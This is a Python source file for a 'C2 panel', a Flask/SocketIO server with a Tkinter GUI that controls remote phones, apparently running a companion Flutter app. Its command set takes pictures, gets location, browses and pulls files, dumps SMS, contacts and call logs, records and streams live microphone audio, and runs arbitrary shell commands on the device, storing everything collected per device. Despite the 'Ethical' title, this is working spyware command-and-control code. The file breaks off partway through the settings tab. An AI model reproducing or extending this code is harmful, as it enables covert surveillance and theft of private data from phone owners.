# c2_panel/app.py

import os
import json
import datetime
import threading
import logging
import webbrowser
import subprocess
import sys
import time # For live audio file naming

from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
from PIL import Image, ImageTk

# --- Basic Settings ---
APP_ROOT = os.path.dirname(os.path.abspath(__file__))
DATA_RECEIVED_DIR = os.path.join(APP_ROOT, "received_data")
LIVE_AUDIO_DIR = os.path.join(APP_ROOT, "live_audio_streams") # For saving live audio chunks
os.makedirs(DATA_RECEIVED_DIR, exist_ok=True)
os.makedirs(LIVE_AUDIO_DIR, exist_ok=True)
DEVICE_TAGS_FILE = os.path.join(APP_ROOT, "device_tags.json")

# Flask and SocketIO Setup
app = Flask(__name__)
app.config["SECRET_KEY"] = (
    "Jk8lP1yH3rT9uV5bX2sE7qZ4oW6nD0fA_MODIFIED_FINAL_V6_IMPROVED" # Updated key for this version
)
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading",
    logger=False,
    engineio_logger=False,
)

# Logging Setup
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("C2Panel")

connected_clients_sio = {}
device_tags = {}
gui_app = None

# --- Constants for Commands (matching Flutter's constants.dart) ---
SIO_CMD_TAKE_PICTURE = 'command_take_picture'
SIO_CMD_LIST_FILES = 'command_list_files'
SIO_CMD_GET_LOCATION = 'command_get_location'
SIO_CMD_UPLOAD_SPECIFIC_FILE = 'command_upload_specific_file'
SIO_CMD_EXECUTE_SHELL = 'command_execute_shell'

SIO_CMD_GET_SMS_LIST = 'command_get_sms_list'
SIO_CMD_GET_CONTACTS_LIST = 'command_get_contacts_list' # Ensured consistency
SIO_CMD_GET_CALL_LOGS = 'command_get_call_logs'
SIO_CMD_RECORD_AUDIO_FIXED = 'command_record_audio_fixed'
SIO_CMD_START_LIVE_AUDIO = 'command_start_live_audio'
SIO_CMD_STOP_LIVE_AUDIO = 'command_stop_live_audio'
SIO_EVENT_LIVE_AUDIO_CHUNK = 'live_audio_chunk'
SIO_EVENT_REQUEST_REGISTRATION_INFO = 'request_registration_info' # Added for completeness here


# --- Utility Functions ---
def load_device_tags():
    global device_tags
    try:
        if os.path.exists(DEVICE_TAGS_FILE):
            with open(DEVICE_TAGS_FILE, "r", encoding="utf-8") as f:
                device_tags = json.load(f)
            logger.info(
                f"Loaded {len(device_tags)} device tags from {DEVICE_TAGS_FILE}"
            )
    except Exception as e:
        logger.error(f"Error loading device tags: {e}", exc_info=True)
        device_tags = {}

def save_device_tags():
    try:
        with open(DEVICE_TAGS_FILE, "w", encoding="utf-8") as f:
            json.dump(device_tags, f, ensure_ascii=False, indent=4)
        logger.info(f"Saved device tags to {DEVICE_TAGS_FILE}")
    except Exception as e:
        logger.error(f"Error saving device tags: {e}", exc_info=True)

# --- Flask API Endpoints ---
@app.route("/")
def index():
    return "C2 Panel is Running. Waiting for connections..."

@app.route("/upload_initial_data", methods=["POST"])
def upload_initial_data():
    logger.info("Request to /upload_initial_data")
    try:
        json_data_str = request.form.get("json_data")
        if not json_data_str:
            logger.error("No json_data found in /upload_initial_data request.")
            return jsonify({"status": "error", "message": "Missing json_data"}), 400

        data = json.loads(json_data_str)
        raw_device_id = data.get("deviceId")
        device_info_for_fallback = data.get("deviceInfo", {})

        if (
            not raw_device_id
            or not isinstance(raw_device_id, str)
            or len(raw_device_id) < 3
        ):
            model = device_info_for_fallback.get("model", "unknown_model")
            name = device_info_for_fallback.get("deviceName", "unknown_device")
            raw_device_id = f"{model}_{name}_{datetime.datetime.now().strftime('%S%f')}"
            logger.warning(f"Using fallback deviceId for initial_data: {raw_device_id}")

        device_id_sanitized = "".join(
            c if c.isalnum() or c in ["_", "-", "."] else "_" for c in raw_device_id
        )
        if (
            not device_id_sanitized
            or device_id_sanitized.lower()
            in ["unknown_model_unknown_device", "_", "unknown_device_unknown_model"]
            or len(device_id_sanitized) < 3
        ):
            device_id_sanitized = f"unidentified_device_{datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')}"

        device_folder_path = os.path.join(DATA_RECEIVED_DIR, device_id_sanitized)
        os.makedirs(device_folder_path, exist_ok=True)
        info_file_name = (
            f'info_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        )
        info_file_path = os.path.join(device_folder_path, info_file_name)
        with open(info_file_path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
        logger.info(f"Saved JSON from /upload_initial_data to {info_file_path}")

        image_file = request.files.get("image")
        if image_file and image_file.filename:
            filename = os.path.basename(image_file.filename)
            base, ext = os.path.splitext(filename)
            if not ext: # Default extension if none provided
                ext = ".jpg"
            image_filename = (
                f"initial_img_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
            )
            image_path = os.path.join(device_folder_path, image_filename)
            image_file.save(image_path)
            logger.info(f"Saved image from /upload_initial_data to {image_path}")

        if gui_app and gui_app.master.winfo_exists():
            gui_app.add_system_log(
                f"Initial data received via HTTP from: {device_id_sanitized}"
            )
            gui_app.refresh_historical_device_list()
        return jsonify({"status": "success", "message": "Initial data received"}), 200
    except json.JSONDecodeError as e:
        logger.error(
            f"Invalid JSON in /upload_initial_data: {request.form.get('json_data', '')[:100]}... Error: {e}"
        )
        return jsonify({"status": "error", "message": "Invalid JSON format"}), 400
    except Exception as e:
        logger.error(f"Error processing /upload_initial_data: {e}", exc_info=True)
        return (
            jsonify({"status": "error", "message": f"Internal server error: {str(e)}"}),
            500,
        )

@app.route("/upload_command_file", methods=["POST"])
def upload_command_file():
    logger.info("Request to /upload_command_file")
    try:
        device_id = request.form.get("deviceId")
        command_ref = request.form.get("commandRef", "unknown_cmd_ref")
        command_id_from_req = request.form.get("commandId", "N_A")
        if not device_id:
            logger.error("'deviceId' missing.")
            return jsonify({"status": "error", "message": "Missing deviceId"}), 400

        device_id_sanitized = "".join(
            c if c.isalnum() or c in ["_", "-", "."] else "_" for c in device_id
        )
        device_folder_path = os.path.join(DATA_RECEIVED_DIR, device_id_sanitized)
        os.makedirs(device_folder_path, exist_ok=True)

        file_data = request.files.get("file")
        if file_data and file_data.filename:
            original_filename = os.path.basename(file_data.filename)
            base, ext = os.path.splitext(original_filename)
            if not ext: # Default extension if none provided by client filename
                ext = ".dat"
            safe_command_ref = "".join(c if c.isalnum() else "_" for c in command_ref)
            safe_command_id = (
                "".join(c if c.isalnum() else "_" for c in command_id_from_req)
                if command_id_from_req != "N_A"
                else "no_id"
            )
            new_filename = f"{safe_command_ref}_{base.replace(' ', '_')}_{safe_command_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
            file_path = os.path.join(device_folder_path, new_filename)
            file_data.save(file_path)
            logger.info(
                f"Saved cmd file '{new_filename}' for dev '{device_id_sanitized}' (CmdID: {command_id_from_req}) to {file_path}"
            )

            if gui_app and gui_app.master.winfo_exists():
                gui_app.add_system_log(
                    f"Received file '{new_filename}' from dev '{device_id_sanitized}' (Ref: {command_ref}, CmdID: {command_id_from_req})."
                )
                if gui_app.current_selected_historical_device_id == device_id_sanitized:
                    gui_app.display_device_details(device_id_sanitized) # Refresh file list
            return (
                jsonify(
                    {
                        "status": "success",
                        "message": "File received by C2",
                        "filename_on_server": new_filename,
                    }
                ),
                200,
            )
        else:
            logger.error("No file data in /upload_command_file or filename empty.")
            return jsonify({"status": "error", "message": "Missing file data"}), 400
    except Exception as e:
        logger.error(f"Error in /upload_command_file: {e}", exc_info=True)
        return jsonify({"status": "error", "message": f"Server error: {str(e)}"}), 500

# --- SocketIO Event Handlers ---
@socketio.on("connect")
def handle_sio_connect():
    client_sid = request.sid
    logger.info(
        f"Client trying to connect: SID={client_sid}, IP={request.remote_addr}. Requesting registration."
    )
    emit(
        SIO_EVENT_REQUEST_REGISTRATION_INFO, # Use constant
        {"message": "Please register device."},
        room=client_sid,
    )

@socketio.on("disconnect")
def handle_sio_disconnect():
    client_sid = request.sid
    if client_sid in connected_clients_sio:
        device_info = connected_clients_sio.pop(client_sid)
        dev_id_display = device_info.get("id", client_sid)
        logger.info(
            f"Device '{dev_id_display}' disconnected (SID={client_sid}, IP={device_info.get('ip','N/A')})."
        )
        if gui_app and gui_app.master.winfo_exists():
            gui_app.update_live_clients_list()
            gui_app.add_system_log(
                f"Device '{dev_id_display}' disconnected (SocketIO)."
            )
            if gui_app.current_selected_live_client_sid == client_sid:
                gui_app._enable_commands(False)
                gui_app.current_selected_live_client_sid = None
                gui_app.live_audio_status_var.set("Live Audio: Idle (Device Disconnected)")
    else:
        logger.warning(
            f"Unknown client disconnected: SID={client_sid}, IP={request.remote_addr}."
        )

@socketio.on("register_device")
def handle_register_device(data):
    client_sid = request.sid
    try:
        device_identifier = data.get("deviceId")
        device_name_display = data.get("deviceName", f"Device_{client_sid[:6]}")
        device_platform = data.get("platform", "Unknown")

        if not device_identifier:
            logger.error(
                f"Registration failed for SID {client_sid}: 'deviceId' missing. Data: {data}"
            )
            emit(
                "registration_failed", # Consider making this a constant
                {"message": "Missing 'deviceId' in registration payload."},
                room=client_sid,
            )
            return

        connected_clients_sio[client_sid] = {
            "sid": client_sid,
            "id": device_identifier,
            "name_display": device_name_display,
            "platform": device_platform,
            "ip": request.remote_addr,
            "connected_at": datetime.datetime.now().isoformat(),
            "last_seen": datetime.datetime.now().isoformat(),
        }
        logger.info(
            f"Device registered: ID='{device_identifier}', Name='{device_name_display}', SID={client_sid}, IP={request.remote_addr}"
        )
        emit(
            "registration_successful", # Consider making this a constant
            {
                "message": "Successfully registered.",
                "sid": client_sid,
                "deviceId": device_identifier,
            },
            room=client_sid,
        )

        if gui_app and gui_app.master.winfo_exists():
            gui_app.update_live_clients_list()
            gui_app.add_system_log(
                f"Device '{device_name_display}' (ID: {device_identifier}) connected via SocketIO from {request.remote_addr}."
            )
            # If this device_identifier matches a currently selected historical device, enable commands
            if gui_app.current_selected_historical_device_id == device_identifier:
                gui_app._enable_commands(True)
                gui_app.current_selected_live_client_sid = client_sid
    except Exception as e:
        logger.error(
            f"Error in handle_register_device for SID {client_sid}: {e}", exc_info=True
        )
        if gui_app and gui_app.master.winfo_exists(): # Check GUI existence before emitting
            emit(
                "registration_failed", # Consider making this a constant
                {"message": f"Server error: {str(e)}"},
                room=client_sid,
            )

@socketio.on("client_data") # This generic handler might be less used if specific events like command_response are primary
def handle_client_data(data):
    # This function might be deprecated or used for very generic, non-command related data
    client_sid = request.sid
    # ... (existing logic, but ensure it doesn't conflict with command_response)
    logger.debug(f"Generic 'client_data' received from SID {client_sid}. Data: {str(data)[:200]}")


@socketio.on("device_heartbeat")
def handle_device_heartbeat(data):
    client_sid = request.sid
    if client_sid in connected_clients_sio:
        connected_clients_sio[client_sid][
            "last_seen"
        ] = datetime.datetime.now().isoformat()
        if gui_app and gui_app.master.winfo_exists():
            gui_app.update_live_clients_list_item(client_sid)
    else:
        logger.warning(
            f"Heartbeat from unknown SID: {client_sid}. Data: {data}. Requesting registration."
        )
        emit(
            SIO_EVENT_REQUEST_REGISTRATION_INFO, # Use constant
            {"message": "Unrecognized heartbeat, please re-register."},
            room=client_sid,
        )

def send_command_to_client(target_id, command_name, args=None):
    args = args if args is not None else {}
    # Try to find SID if target_id is a device_id, or use directly if it's an SID
    sid_to_use = (
        target_id
        if target_id in connected_clients_sio # target_id is already an SID
        else next( # target_id is a device_identifier, find its SID
            (s for s, i in connected_clients_sio.items() if i.get("id") == target_id),
            None,
        )
    )

    if not sid_to_use:
        errmsg = f"Target device '{target_id}' not live for command '{command_name}'."
        logger.error(errmsg)
        if gui_app and gui_app.master.winfo_exists():
            messagebox.showerror("Command Error", errmsg, parent=gui_app.master)
        return {"status": "error", "message": errmsg, "command_id": None}

    dev_id_for_log = connected_clients_sio[sid_to_use].get("id", "UnknownDeviceID")
    cmd_id = f"{command_name.replace('command_','')}_{datetime.datetime.now().strftime('%H%M%S%f')}"
    payload = {"command": command_name, "command_id": cmd_id, "args": args}
    logger.info(
        f"Sending cmd '{command_name}' (ID: {cmd_id}) to dev '{dev_id_for_log}' (SID: {sid_to_use}) with args: {args}"
    )
    try:
        socketio.emit("command", payload, to=sid_to_use)
        if gui_app and gui_app.master.winfo_exists():
            gui_app.add_system_log(
                f"Sent cmd '{command_name}' (ID: {cmd_id}) to dev '{dev_id_for_log}'."
            )
        return {"status": "sent", "command_id": cmd_id}
    except Exception as e_emit:
        errmsg = f"Error emitting cmd '{command_name}' to SID {sid_to_use}: {e_emit}"
        logger.error(errmsg, exc_info=True)
        if gui_app and gui_app.master.winfo_exists():
            messagebox.showerror("Socket Emit Error", errmsg, parent=gui_app.master)
            gui_app.add_system_log(errmsg, error=True)
        return {"status": "error", "message": errmsg, "command_id": cmd_id}

@socketio.on("command_response")
def handle_command_response(data):
    client_sid = request.sid
    dev_info = connected_clients_sio.get(client_sid)
    if not dev_info:
        logger.warning(
            f"Cmd response from unknown SID: {client_sid}. Data: {str(data)[:100]}"
        )
        emit(SIO_EVENT_REQUEST_REGISTRATION_INFO, room=client_sid) # Use constant
        return

    dev_id = dev_info.get("id", f"SID_{client_sid}")
    cmd = data.get("command", "unknown")
    cmd_id = data.get("command_id", "N_A")
    status = data.get("status", "N/A")
    payload = data.get("payload", {})
    logger.info(
        f"Response for '{cmd}' (ID: {cmd_id}) from '{dev_id}'. Status: {status}."
    )
    if status == "error":
        logger.error(
            f"Error from '{dev_id}' for '{cmd} (ID: {cmd_id})': {payload.get('message', payload)}"
        )

    if gui_app and gui_app.master.winfo_exists():
        gui_app.add_system_log(
            f"Response for '{cmd}' (ID: {cmd_id}) from '{dev_id}': {status}"
        )
        gui_app.display_command_response(dev_id, cmd, status, payload, cmd_id)
        if (
            "filename_on_server" in payload
            or "_dump_file" in payload.get("message", "").lower() # Generic check for dump files
        ) and gui_app.current_selected_historical_device_id == dev_id:
            gui_app.display_device_details(dev_id) # Refresh file list

@socketio.on(SIO_EVENT_LIVE_AUDIO_CHUNK)
def handle_live_audio_chunk(data):
    client_sid = request.sid
    dev_info = connected_clients_sio.get(client_sid)
    if not dev_info:
        logger.warning(f"Live audio chunk from unknown SID: {client_sid}. Ignoring.")
        return

    device_id = dev_info.get("id", f"SID_{client_sid}")
    try:
        audio_chunk_bytes = data.get('chunk')
        # timestamp = data.get('timestamp', datetime.datetime.now().isoformat()) # Client sends this

        if isinstance(audio_chunk_bytes, bytes) and len(audio_chunk_bytes) > 0:
            device_audio_dir = os.path.join(LIVE_AUDIO_DIR, "".join(c if c.isalnum() or c in ["_", "-"] else "_" for c in device_id))
            os.makedirs(device_audio_dir, exist_ok=True)
            
            # Use a high-resolution timestamp for unique filenames
            chunk_filename = f"audio_chunk_{time.time_ns()}.aac" # Assuming client sends AAC chunks in .m4a container or raw AAC
            chunk_file_path = os.path.join(device_audio_dir, chunk_filename)

            with open(chunk_file_path, "wb") as f:
                f.write(audio_chunk_bytes)
            
            logger.debug(f"Live audio chunk ({len(audio_chunk_bytes)} bytes) from '{device_id}' saved to {chunk_file_path}")
            
            if gui_app and gui_app.master.winfo_exists():
                # Update status if this device is selected (either as live or historical if it's the same device)
                is_selected_device = False
                if gui_app.current_selected_live_client_sid == client_sid:
                    is_selected_device = True
                elif gui_app.current_selected_historical_device_id == device_id:
                     # Check if the historical selection corresponds to this live SID
                     live_sid_for_historical = next((s for s, i in connected_clients_sio.items() if i.get("id") == device_id), None)
                     if live_sid_for_historical == client_sid:
                         is_selected_device = True
                
                if is_selected_device:
                    gui_app.live_audio_status_var.set(f"Receiving audio... Last chunk: {len(audio_chunk_bytes)} bytes")
                    # Placeholder for actual playback:
                    # if hasattr(gui_app, 'audio_player') and gui_app.audio_player:
                    #     gui_app.audio_player.add_chunk(audio_chunk_bytes)
        else:
            logger.warning(f"Received invalid live audio chunk from '{device_id}': type {type(audio_chunk_bytes)}, len {len(audio_chunk_bytes) if isinstance(audio_chunk_bytes, bytes) else 'N/A'}")

    except Exception as e:
        logger.error(f"Error handling live audio chunk from '{device_id}': {e}", exc_info=True)


# --- GUI Class (C2PanelGUI) ---
class C2PanelGUI:
    def __init__(self, master):
        self.master = master
        master.title("Ethical C2 Panel - v0.8.1") # Version increment
        master.geometry("1500x1000")
        master.minsize(1250, 800)

        self.style = ttk.Style()
        try:
            self.style.theme_use("clam")
        except tk.TclError:
            logger.warning("Clam theme not available, using default.")
            self.style.theme_use("default") # Fallback theme
        self.style.configure("Treeview.Heading", font=("Segoe UI", 10, "bold"))
        self.style.configure("TLabelframe.Label", font=("Segoe UI", 10, "bold"), foreground="teal")
        self.style.configure("TButton", padding=6, font=("Segoe UI", 9))
        self.style.configure("TMenubutton", padding=6, font=("Segoe UI", 9))

        self.current_selected_historical_device_id = None
        self.current_selected_live_client_sid = None
        self.current_device_files_tree_items = {}
        self.live_audio_status_var = tk.StringVar(value="Live Audio: Idle")

        # --- Main Paned Window ---
        self.paned_window = ttk.PanedWindow(master, orient=tk.HORIZONTAL)
        self.paned_window.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # --- Left Pane (Device Lists) ---
        self.left_pane = ttk.Frame(self.paned_window, width=550)
        self.paned_window.add(self.left_pane, weight=2)

        hist_devices_frame = ttk.LabelFrame(self.left_pane, text="Stored Device Data (Folders)")
        hist_devices_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        hist_list_frame = ttk.Frame(hist_devices_frame)
        hist_list_frame.pack(fill=tk.BOTH, expand=True, pady=5, padx=5)
        self.hist_device_listbox = tk.Listbox(hist_list_frame, selectmode=tk.SINGLE, height=12, exportselection=False, font=("Segoe UI", 9))
        self.hist_device_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        hist_scrollbar = ttk.Scrollbar(hist_list_frame, orient=tk.VERTICAL, command=self.hist_device_listbox.yview)
        hist_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.hist_device_listbox.config(yscrollcommand=hist_scrollbar.set)
        self.hist_device_listbox.bind("<<ListboxSelect>>", self.on_historical_device_select)
        hist_actions_frame = ttk.Frame(hist_devices_frame)
        hist_actions_frame.pack(fill=tk.X, padx=5, pady=(2,5))
        self.edit_tag_button = ttk.Button(hist_actions_frame, text="Edit Tag", command=self.edit_selected_device_tag, state=tk.DISABLED)
        self.edit_tag_button.pack(side=tk.LEFT, padx=(0,5))


        live_clients_frame = ttk.LabelFrame(self.left_pane, text="Live Connected Devices (SocketIO)")
        live_clients_frame.pack(pady=(10,5), padx=5, fill=tk.BOTH, expand=True)
        live_tree_frame = ttk.Frame(live_clients_frame)
        live_tree_frame.pack(fill=tk.BOTH, expand=True, pady=5, padx=5)
        self.live_clients_tree = ttk.Treeview(live_tree_frame, columns=("device_id", "name_display", "tags", "ip", "connected_at", "last_seen", "sid"), show="headings", height=12)
        cols = {
            "device_id": (140, "Device ID"), "name_display": (120, "Display Name"), "tags": (80, "Tags"),
            "ip": (100, "IP Address"), "connected_at": (140, "Connected"), "last_seen": (140, "Last Seen"),
            "sid": (0, "Session ID") 
        }
        for col_id, (width, text) in cols.items():
            self.live_clients_tree.heading(col_id, text=text)
            self.live_clients_tree.column(col_id, width=width, anchor=tk.W, stretch=(col_id != "sid"))
        live_scrollbar = ttk.Scrollbar(live_tree_frame, orient=tk.VERTICAL, command=self.live_clients_tree.yview)
        self.live_clients_tree.configure(yscrollcommand=live_scrollbar.set)
        self.live_clients_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        live_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.live_clients_tree.bind("<<TreeviewSelect>>", self.on_live_client_select)


        # --- Right Pane (Notebook for details, commands, logs) ---
        self.right_pane = ttk.Frame(self.paned_window)
        self.paned_window.add(self.right_pane, weight=5)
        self.notebook = ttk.Notebook(self.right_pane)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        # Tab 1: Device Details & Files
        self.device_details_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.device_details_tab, text="Device Details & Files")
        details_top_container = ttk.Frame(self.device_details_tab)
        details_top_container.pack(fill=tk.X, pady=5, padx=5)
        self.device_details_frame = ttk.LabelFrame(details_top_container, text="Device Information (Stored)")
        self.device_details_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0,5))
        self.device_info_text = scrolledtext.ScrolledText(self.device_details_frame, height=8, width=50, wrap=tk.WORD, font=("Segoe UI", 9))
        self.device_info_text.pack(pady=5, padx=5, fill=tk.X, expand=True)
        self.device_info_text.config(state=tk.DISABLED)

        stored_files_frame = ttk.LabelFrame(details_top_container, text="Stored Files (on C2 Server)")
        stored_files_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5,0))
        self.files_listbox = tk.Listbox(stored_files_frame, selectmode=tk.SINGLE, height=8, exportselection=False, font=("Segoe UI", 9))
        self.files_listbox.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.files_listbox.bind("<<ListboxSelect>>", self.on_file_select)
        self.open_stored_file_button = ttk.Button(stored_files_frame, text="Open/Preview Selected Stored File", command=self.open_selected_stored_file, state=tk.DISABLED)
        self.open_stored_file_button.pack(pady=(2,5))
        
        self.device_file_browser_frame = ttk.LabelFrame(self.device_details_tab, text="Live File Browser (Live Device)")
        self.device_file_browser_frame.pack(pady=(10,0), padx=5, fill=tk.BOTH, expand=True)
        path_controls_frame = ttk.Frame(self.device_file_browser_frame)
        path_controls_frame.pack(fill=tk.X, pady=2, padx=2)
        ttk.Label(path_controls_frame, text="Current Path:").pack(side=tk.LEFT, padx=(0,5))
        self.current_path_label = ttk.Label(path_controls_frame, text="/", relief=tk.GROOVE, anchor=tk.W, padding=(5,2))
        self.current_path_label.pack(side=tk.LEFT, fill=tk.X, expand=True)

        self.file_browser_tree_frame = ttk.Frame(self.device_file_browser_frame)
        self.file_browser_tree_frame.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        self.file_browser_tree = ttk.Treeview(self.file_browser_tree_frame, columns=("type", "size", "modified", "perms", "full_path"), show="tree headings", height=8)
        fb_cols = {
            "#0": (250, "Name", tk.W, tk.YES),
            "type": (60, "Type", tk.CENTER, tk.NO),  # Added tk.NO for stretch
            "size": (90, "Size (KB)", tk.E, tk.NO),   # Added tk.NO for stretch
            "modified": (140, "Modified", tk.W, tk.YES), # Added tk.YES for stretch
            "perms": (80, "Perms", tk.W, tk.NO),     # Added tk.NO for stretch
            "full_path": (0, "Full Path", tk.W, tk.NO)
        }
        for col_id, (width, text, anchor, stretch) in fb_cols.items():
            self.file_browser_tree.heading(col_id, text=text)
            self.file_browser_tree.column(col_id, width=width, anchor=anchor, stretch=stretch)
        fb_yscoll = ttk.Scrollbar(self.file_browser_tree_frame, orient=tk.VERTICAL, command=self.file_browser_tree.yview)
        fb_xscroll = ttk.Scrollbar(self.file_browser_tree_frame, orient=tk.HORIZONTAL, command=self.file_browser_tree.xview)
        self.file_browser_tree.configure(yscrollcommand=fb_yscoll.set, xscrollcommand=fb_xscroll.set)
        self.file_browser_tree.grid(row=0, column=0, sticky="nsew")
        fb_yscoll.grid(row=0, column=1, sticky="ns")
        fb_xscroll.grid(row=1, column=0, sticky="ew")
        self.file_browser_tree_frame.grid_rowconfigure(0, weight=1)
        self.file_browser_tree_frame.grid_columnconfigure(0, weight=1)
        self.file_browser_tree.bind("<Double-1>", self.on_file_browser_double_click)
        self.file_browser_tree.bind("<<TreeviewSelect>>", self.on_file_browser_select)

        browser_buttons_frame = ttk.Frame(self.device_file_browser_frame)
        browser_buttons_frame.pack(fill=tk.X, pady=(5,0), padx=2)
        self.download_device_file_button = ttk.Button(browser_buttons_frame, text="Request Download of Selected File", command=self.request_device_file_download, state=tk.DISABLED)
        self.download_device_file_button.pack(side=tk.LEFT, padx=(0,5))
        self.go_up_button = ttk.Button(browser_buttons_frame, text="Go Up ..", command=self.file_browser_go_up, state=tk.DISABLED)
        self.go_up_button.pack(side=tk.LEFT)

        preview_frame = ttk.LabelFrame(self.device_details_tab, text="Stored File Preview / Info")
        preview_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.preview_text = scrolledtext.ScrolledText(preview_frame, height=7, width=80, wrap=tk.WORD, font=("Consolas", 9))
        self.preview_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.preview_text.config(state=tk.DISABLED)


        # Tab 2: Commands
        self.commands_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.commands_tab, text="Commands")
        commands_content_frame = ttk.Frame(self.commands_tab)
        commands_content_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        commands_buttons_frame = ttk.LabelFrame(commands_content_frame, text="Send Commands (to Selected Live Device)")
        commands_buttons_frame.pack(pady=10, padx=10, fill=tk.X)

        btn_config = [
            ("Get Location", self.send_get_location, 0, 0),
            ("Take Screenshot", self.send_take_picture, 0, 1),
            ("List Files", self.send_list_files_prompt, 0, 2),
            ("Req. Upload File", self.send_upload_specific_file_prompt, 0, 3),
            
            ("Get SMS", lambda: self.send_simple_command(SIO_CMD_GET_SMS_LIST), 1, 0),
            ("Get Contacts", lambda: self.send_simple_command(SIO_CMD_GET_CONTACTS_LIST), 1, 1),
            ("Get Call Logs", lambda: self.send_simple_command(SIO_CMD_GET_CALL_LOGS), 1, 2),
            ("Record Audio (10s)", lambda: self.send_record_audio_fixed(10), 1, 3),
            
            ("Start Live Audio", self.send_start_live_audio, 2, 0),
            ("Stop Live Audio", self.send_stop_live_audio, 2, 1),
            ("Open Live Audio Folder", self.open_live_audio_folder_for_device, 2, 2), # New Button
        ]

        self.command_buttons = {} # Store button references
        for i, (text, cmd_func, r, c) in enumerate(btn_config):
            btn = ttk.Button(commands_buttons_frame, text=text, command=cmd_func)
            btn.grid(row=r, column=c, padx=5, pady=5, sticky="ew")
            commands_buttons_frame.columnconfigure(c, weight=1)
            self.command_buttons[text] = btn # Store reference


        live_audio_status_frame = ttk.Frame(commands_buttons_frame)
        # Place it appropriately, e.g., after audio commands
        live_audio_status_frame.grid(row=2, column=3, padx=5, pady=5, sticky="ew") # Adjusted column
        ttk.Label(live_audio_status_frame, textvariable=self.live_audio_status_var, font=("Segoe UI", 9, "italic")).pack(side=tk.LEFT)


        custom_cmd_outer_frame = ttk.LabelFrame(commands_content_frame, text="Custom Command / Shell")
        custom_cmd_outer_frame.pack(pady=10, padx=10, fill=tk.X)
        custom_cmd_frame = ttk.Frame(custom_cmd_outer_frame)
        custom_cmd_frame.pack(pady=5, padx=5, fill=tk.X)
        ttk.Label(custom_cmd_frame, text="Cmd Name:").grid(row=0, column=0, padx=(0,2), pady=5, sticky=tk.W)
        self.custom_cmd_entry = ttk.Entry(custom_cmd_frame, width=30)
        self.custom_cmd_entry.grid(row=0, column=1, padx=(0,5), pady=5, sticky=tk.EW)
        self.custom_cmd_entry.insert(0, SIO_CMD_EXECUTE_SHELL) # Default to execute_shell
        ttk.Label(custom_cmd_frame, text="Args (JSON):").grid(row=1, column=0, padx=(0,2), pady=5, sticky=tk.W)
        self.custom_args_entry = ttk.Entry(custom_cmd_frame, width=60)
        self.custom_args_entry.grid(row=1, column=1, columnspan=3, padx=(0,5), pady=5, sticky=tk.EW)
        self.custom_args_entry.insert(0, '{"command_name": "getprop", "command_args": ["ro.build.version.release"]}')
        self.custom_cmd_btn = ttk.Button(custom_cmd_frame, text="Send Custom", command=self.send_custom_command)
        self.custom_cmd_btn.grid(row=0, column=2, rowspan=2, padx=5, pady=5, ipady=10, sticky="ns")
        custom_cmd_frame.columnconfigure(1, weight=1)


        response_frame = ttk.LabelFrame(commands_content_frame, text="Command Responses")
        response_frame.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)
        self.response_text = scrolledtext.ScrolledText(response_frame, height=12, width=80, wrap=tk.WORD, font=("Consolas", 9))
        self.response_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.response_text.config(state=tk.DISABLED)


        # Tab 3: Data Viewer
        self.data_viewer_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.data_viewer_tab, text="Data Viewer")
        data_viewer_content_frame = ttk.LabelFrame(self.data_viewer_tab, text="View SMS, Contacts, Call Logs (from Stored JSON Files)")
        data_viewer_content_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.data_viewer_text = scrolledtext.ScrolledText(data_viewer_content_frame, height=20, width=100, wrap=tk.WORD, font=("Consolas", 10))
        self.data_viewer_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.data_viewer_text.config(state=tk.DISABLED)

        # Tab 4: System Log
        self.log_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.log_tab, text="System Log")
        log_frame = ttk.LabelFrame(self.log_tab, text="System Events")
        log_frame.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)
        self.log_text = scrolledtext.ScrolledText(log_frame, height=30, width=100, wrap=tk.WORD, font=("Consolas", 9))
        self.log_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)


        # Tab 5: Settings
        self.settings_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.settings_tab, text="Settings")
        settings_content_frame = ttk.Frame(self.settings_tab)
        settings_content_frame.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)
        server_info_frame = ttk.LabelFrame(settings_content_frame, text="Server Info")
        server_info_frame.pack(pady=5, padx=5, fill=tk.X, expand=False)
        ttk.Label(server_info_frame, text="Server Status:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.server_status_label = ttk.Label(server_info_frame, text="Running", foreground="green")
        self.server_status_label.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
